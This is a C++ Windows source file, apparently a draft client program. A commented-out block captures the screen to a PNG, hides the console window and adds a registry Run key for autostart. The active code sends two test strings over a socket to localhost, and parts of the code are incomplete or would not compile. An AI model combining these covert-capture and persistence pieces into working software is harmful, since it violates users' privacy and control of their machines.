#pragma comment(lib, "gdiplus.lib")
#include <windows.h>
#include <iostream>
#include <conio.h>
#include <gdiplus.h>

using namespace std;
using namespace Gdiplus;

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
	UINT num = 0;
	UINT size = 0;

	ImageCodecInfo* pImage = NULL;

	GetImageEncodersSize(&num, &size);
	if (size == 0) return -1;

	pImage = (ImageCodecInfo*)(malloc(size));
	if (pImage == NULL) return -1;

	GetImageEncoders(num, size, pImage);

	for (UINT j = 0; j < num; ++j)
	{
		if (wcscmp(pImage[j].MimeType, format) == 0)
		{
			*pClsid = pImage[j].Clsid;
			free(pImage);
			return j;
		}
	}

	free(pImage);
	return -1;
}

/*int main()
{
	HDC hdcScreen = GetDC(NULL);
	HDC hdcMemDC = CreateCompatibleDC(hdcScreen);
	HBITMAP hbmScreen = NULL;

	GdiplusStartupInput gdip;
	ULONG_PTR gdipToken;
	GdiplusStartup(&gdipToken, &gdip, NULL);

	hbmScreen = CreateCompatibleBitmap(hdcScreen, 2000, 1000);
	SelectObject(hdcMemDC, hbmScreen);

	BitBlt(hdcMemDC, 0, 0, 2000, 1000, hdcScreen, 0, 0, SRCCOPY);

	CLSID encoderID;

	GetEncoderClsid(L"image/png", &encoderID);//image/jpeg

	Bitmap* bmp = new Bitmap(hbmScreen, (HPALETTE)0);
	bmp->Save(L"C:\\Users\\user\\Desktop\\test\\client\\IMAGEOFSCREE345435645645N.png", &encoderID, NULL);
	GdiplusShutdown(gdipToken);

	DeleteObject(hbmScreen);
	DeleteObject(hdcMemDC);
	ReleaseDC(NULL, hdcScreen);

	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);//убрать в фон

	HKEY hg;
	RegOpenKeyEx(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hg);
	RegSetValueEx(hg, L"Краткое название программы или имя ключа", 0, REG_SZ+1, "путь к программе", длина пути к файлу);//автозапуск
	RegCloseKey(hg);

}*/
int main()
{
	int sock;
	int result;
	struct sockaddr_in addr;
	char msg_1[] = "Alisa";
	char msg_2[] = "Bob";

	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock < 0)
	{
		perror("socket");
		exit(1);
	}

	addr.sin_family = AF_INET;
	std::cout << AF_INET;
	addr.sin_port = htons(8000);
	addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

	result = connect(sock, (struct sockaddr*)&addr, sizeof(addr));
	if (result < 0)
	{
		perror("connect");
		exit(2);
	}

	send(sock, msg_1, sizeof(msg_1), 0);
	send(sock, msg_2, sizeof(msg_2), 0);

	//close(sock);

	return 0;

}
